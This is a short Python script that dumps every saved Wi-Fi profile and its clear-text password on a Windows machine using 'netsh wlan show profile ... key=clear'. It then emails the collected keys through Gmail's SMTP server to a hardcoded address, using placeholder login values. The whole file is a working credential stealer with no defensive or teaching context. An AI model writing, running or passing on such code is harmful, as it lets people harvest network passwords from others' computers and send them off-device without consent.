mymail = "testmail"
mypass = "testpass"

#Imports
import subprocess
import smtplib
import re

#Functions

#Sends a mail to a specified email address 
def sendmail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

#Command to show all networks
command = "netsh wlan show profile"

#Finds all network names
networks = subprocess.check_output(command, shell=True)
network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks.decode())
result = ""

#Gets all network passwords
for network in network_names_list:
    command = "netsh wlan show profile " + network + " key=clear"
    current_result = subprocess.check_output(command, shell=True, encoding="UTF-8")
    result = result + str(current_result)

#Sends output as an email to the specified email
sendmail(mymail, mypass, "\n" + result)
